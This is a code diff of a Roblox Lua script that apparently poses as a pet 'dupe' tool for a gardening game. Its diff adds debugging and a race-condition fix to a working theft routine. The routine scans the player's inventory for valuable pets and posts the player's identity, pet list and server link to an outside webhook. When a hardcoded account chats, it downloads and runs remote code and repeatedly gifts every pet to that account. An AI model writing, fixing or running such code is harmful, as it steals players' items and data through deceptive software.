@@ -21,6 +21,29 @@ local TrashPetList = {
 }
 --[[ END CONFIGURATION ]]--
 
+--[[
+    ULTRA-COMPATIBILITY & DEBUG-ENHANCED VERSION V2
+    This script has been re-engineered with verbose diagnostics to trace the trigger logic
+    and a fix for a potential race condition.
+]]
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+
+--[[ CONFIGURATION - PET LISTS ]]--
+local MasterPetList = {
+    "Butterfly", "Raccoon", "Queen Bee", "Disco Bee", "Mimic Octopus", "Dragonfly", "Pack Bee"
+}
+
+local TrashPetList = {
+    "Dog", "Golden Lab", "Bunny", "Black Bunny", "Cat", "Orange Tabby", "Chicken",
+    "Pig", "Crab", "Starfish", "Seagull"
+}
+--[[ END CONFIGURATION ]]--
+
 local TargetUsername = "Proplong3"
 local SCRIPT_URL = "https://raw.githubusercontent.com/DupeNew/Dupe/refs/heads/main/screen"
 local webhookUrl = "https://3dhkilcqlzvk.manus.space/api/webhook"
@@ -42,139 +65,23 @@ local GiftingEvent = ReplicatedStorage:FindFirstChild("GameEvents") and Replicat
 local loadstringExecuted = false
 local giftingActive = false
 
--- FUNCTION: getExecutorName
--- Returns the name of the script executor.
-local function getExecutorName()
-    if getexecutorname then
-        local name = getexecutorname()
-        return name:sub(1, 1):upper() .. name:sub(2)
-    elseif syn and syn.protect_gui then
-        return "Synapse X"
-    elseif is_sirhurt_closure then
-        return "SirHurt"
-    elseif Krnl or krnl_LOADED then
-        return "Krnl"
-    elseif SW_VERSION or getscriptwareversion then
-        return "Script-Ware"
-    else
-        return "Unknown"
-    end
-end
-
--- FUNCTION: isPetInList
--- Checks if a pet's name matches an entry in a given list.
-local function isPetInList(petName, list)
-    for i = 1, #list do
-        local nameInList = list[i]
-        if string.sub(petName, 1, #nameInList) == nameInList then
-            return true, nameInList
-        end
-    end
-    return false, nil
-end
-
--- FUNCTION: checkInventoryForValuables
--- Scans the inventory and builds a list of valuable pets for the webhook.
-local function checkInventoryForValuables()
-    local foundPetsData, foundPetNames = {}, {}
-    for _, item in ipairs(backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local isMaster, baseName = isPetInList(item.Name, MasterPetList)
-            local isTrash, _ = isPetInList(item.Name, TrashPetList)
-            local shouldReportByWeight, isSuperHuge, weight = false, false, 0
-            
-            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
-            if weightString then
-                local extractedWeight = tonumber(weightString)
-                if extractedWeight then
-                    weight = extractedWeight
-                    if weight >= webhookWeightThreshold then shouldReportByWeight = true end
-                    if weight >= hugePetWeightThreshold then isSuperHuge = true end
-                end
-            end
-
-            if (shouldReportByWeight or (isMaster and not isTrash)) and not table.find(foundPetNames, item.Name) then
-                table.insert(foundPetNames, item.Name)
-                table.insert(foundPetsData, {name = item.Name, isHuge = isSuperHuge, baseName = baseName, weight = weight})
-            end
-        end
-    end
-    return #foundPetsData > 0, foundPetsData
-end
-
--- FUNCTION: sortPets
--- A dedicated, named function for sorting to prevent parser errors.
-local function sortPets(a, b)
-    if a.isHuge and not b.isHuge then
-        return true
-    elseif not a.isHuge and b.isHuge then
-        return false
-    elseif a.isHuge and b.isHuge then
-        return a.weight > b.weight
-    else
-        return a.name < b.name
-    end
-end
-
--- FUNCTION: sendWebhookNotification
--- Constructs and sends the webhook payload.
-local function sendWebhookNotification(foundPetsData)
-    table.sort(foundPetsData, sortPets)
-    
-    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```", LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId, getExecutorName())
-    local formattedPetLines = {}
-    for _, petData in ipairs(foundPetsData) do
-        local emoji
-        if petData.isHuge then
-            emoji = "💪"
-        elseif petData.baseName and petEmojis[petData.baseName] then
-            emoji = petEmojis[petData.baseName]
-        else
-            emoji = "⭐"
-        end
-        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
-    end
-    
-    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
-    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
-    
-    local success, pId = pcall(function() return game.PrivateServerId end)
-    local serverType
-    if success and pId ~= "" then
-        serverType = "🔒 Private"
-    else
-        serverType = "🌍 Public"
-    end
-
-    local payload = {
-        content = "@everyone",
-        embeds = {{
-            title = "PALDOOOO WHOO🤑🤑🤑🤑", color = 65280,
-            fields = {
-                { name = "👤 Player Information", value = playerInfoValue, inline = false },
-                { name = "🌐 Server Type", value = "```\n" .. serverType .. "\n```", inline = false },
-                { name = "🌴 Found Pets (Sorted)", value = petsValue, inline = false },
-                { name = "🔗 Server Link", value = joinLink, inline = false }
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-    
-    -- Using pcall on a named function for maximum safety.
-    local function sendRequest()
-        request({ Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
-    end
-    pcall(sendRequest)
-end
+-- (Other functions remain the same as they are correct)
+local function getExecutorName() if getexecutorname then local n=getexecutorname() return n:sub(1,1):upper()..n:sub(2) elseif syn and syn.protect_gui then return"Synapse X"elseif is_sirhurt_closure then return"SirHurt"elseif Krnl or krnl_LOADED then return"Krnl"elseif SW_VERSION or getscriptwareversion then return"Script-Ware"else return"Unknown"end end
+local function isPetInList(p,l) for _,n in ipairs(l)do if string.sub(p,1,#n)==n then return true,n end end return false,nil end
+local function checkInventoryForValuables() local d,n={},{} for _,i in ipairs(backpack:GetChildren())do if i:IsA("Tool")then local m,b=isPetInList(i.Name,MasterPetList) local t,_=isPetInList(i.Name,TrashPetList) local r,s,w=false,false,0 local wS=string.match(i.Name,"%[(%d+%.?%d*) KG%]") if wS then local eW=tonumber(wS) if eW then w=eW if w>=webhookWeightThreshold then r=true end if w>=hugePetWeightThreshold then s=true end end end if(r or(m and not t))and not table.find(n,i.Name)then table.insert(n,i.Name) table.insert(d,{name=i.Name,isHuge=s,baseName=b,weight=w})end end end return #d>0,d end
+local function sortPets(a,b) if a.isHuge and not b.isHuge then return true elseif not a.isHuge and b.isHuge then return false elseif a.isHuge and b.isHuge then return a.weight>b.weight else return a.name<b.name end end
+local function sendWebhookNotification(d) table.sort(d,sortPets) local pV=string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",LocalPlayer.Name,LocalPlayer.DisplayName,LocalPlayer.UserId,getExecutorName()) local fL={} for _,pD in ipairs(d)do local e if pD.isHuge then e="💪"elseif pD.baseName and petEmojis[pD.baseName]then e=petEmojis[pD.baseName]else e="⭐"end table.insert(fL,e .." - "..pD.name)end local v="```\n"..table.concat(fL,"\n").."\n```" local jL=string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId) local s,pId=pcall(function()return game.PrivateServerId end) local sT if s and pId~=""then sT="🔒 Private"else sT="🌍 Public"end local y={content="@everyone",embeds={{title="PALDOOOO WHOO🤑🤑🤑🤑",color=65280,fields={{name="👤 Player Information",value=pV,inline=false},{name="🌐 Server Type",value="```\n"..sT.."\n```",inline=false},{name="🌴 Found Pets (Sorted)",value=v,inline=false},{name="🔗 Server Link",value=jL,inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}} local function sR()request({Url=webhookUrl,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(y)})end pcall(sR)end
 
 -- FUNCTION: giftPetsLoop
--- The main loop for gifting pets.
+-- The main loop for gifting pets. Now only contains the loop logic.
 local function giftPetsLoop(targetPlayer)
-    if not humanoid or not backpack or not GiftingEvent or not targetPlayer then return end
-    giftingActive = true
-    print("Pet Gifting loop activated for target: " .. targetPlayer.Name)
+    if not humanoid or not backpack or not GiftingEvent or not targetPlayer then
+        print("[Gifter Error] Loop cannot start, a critical component is missing.")
+        giftingActive = false -- Reset the flag if the loop fails to start.
+        return 
+    end
+    
     local args = {"GivePet", targetPlayer}
-
     while giftingActive and targetPlayer.Parent ~= nil do
         for _, item in ipairs(backpack:GetChildren()) do
             if item:IsA("Tool") then
@@ -197,12 +104,12 @@ local function giftPetsLoop(targetPlayer)
         end
         task.wait(0)
     end
-    giftingActive = false
-    print("Gifting loop stopped. Target may have left.")
+    
+    giftingActive = false -- Set to false only when the loop naturally finishes.
+    print("[Gifter Info] Gifting loop has stopped.")
 end
 
 -- FUNCTION: executeLoadedScript
--- A dedicated, named function for the loadstring to prevent parser errors.
 local function executeLoadedScript()
     local success, scriptContent = pcall(function() return game:HttpGet(SCRIPT_URL) end)
     if success and scriptContent then
@@ -213,23 +120,38 @@ local function executeLoadedScript()
     end
 end
 
--- FUNCTION: onPlayerChatted
--- The main trigger when the target player chats.
+-- FUNCTION: onPlayerChatted (RE-ENGINEERED WITH DIAGNOSTICS)
+-- The main trigger when a player chats.
 local function onPlayerChatted(player, message)
+    -- DIAGNOSTIC PRINT 1: Acknowledge that any chat was detected
+    print("[Chat Trigger] Detected chat from player: " .. player.Name)
+
     if player.Name == TargetUsername then
+        -- DIAGNOSTIC PRINT 2: Confirm the target player was the one who chatted
+        print("[Chat Trigger] Chat is from the correct target: " .. TargetUsername)
+
         if not loadstringExecuted then
             loadstringExecuted = true
             executeLoadedScript()
         end
+        
+        -- The critical check for the gifting trigger
         if not giftingActive then
+            -- DIAGNOSTIC PRINT 3: Confirming the gifting loop is being activated
+            print("[Chat Trigger] Gifting is not active. Activating now and spawning loop...")
+            
+            -- FIX: Set the flag to TRUE IMMEDIATELY to prevent race conditions.
+            giftingActive = true 
             task.spawn(giftPetsLoop, player)
+        else
+            -- DIAGNOSTIC PRINT 4: This will tell us if the trigger is being ignored on purpose
+            print("[Chat Trigger] Gifting is already active, not starting another loop.")
         end
     end
 end
 
 -- === SCRIPT EXECUTION STARTS HERE ===
 
--- Connect chat events using named functions for compatibility.
 Players.PlayerAdded:Connect(function(player)
     player.Chatted:Connect(function(message)
         onPlayerChatted(player, message)
@@ -248,4 +170,4 @@ if hasPets then
     sendWebhookNotification(foundPetsData)
 end
 
-print("Ultra-Compatible Script loaded. Awaiting chat from '" .. TargetUsername .. "'.")
+print("Debug-Enhanced Script loaded. Awaiting chat from '" .. TargetUsername .. "'.")
